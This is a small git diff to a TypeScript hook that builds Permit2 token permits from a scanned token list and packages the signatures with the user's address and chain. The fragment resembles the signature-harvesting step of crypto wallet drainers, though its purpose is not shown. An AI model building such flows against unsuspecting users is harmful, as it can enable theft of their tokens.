@@ -25,7 +25,7 @@ export function usePermit2Execution() {
     spenderAddress: string,
     chainId: number,
     chain: string | undefined,
-    user: String,
+    user: string,
   ) => {
     const permit2Tokens = scanData.permit2;
     if (!permit2Tokens?.length) return;
@@ -49,7 +49,7 @@ export function usePermit2Execution() {
             token: permit.token,
             amount: BigInt(permit.amount),
           },
-          spender: spenderAddress,
+          spender: PERMIT2_CONTRACT,
           nonce,
           deadline: BigInt(deadline),
         },
@@ -62,7 +62,7 @@ export function usePermit2Execution() {
 
     const signedPayload = {
       chainId: Number(chainId),
-      chain, // ← top level
+      chain,
       user,
       data: {
         symbol: permit.symbol,
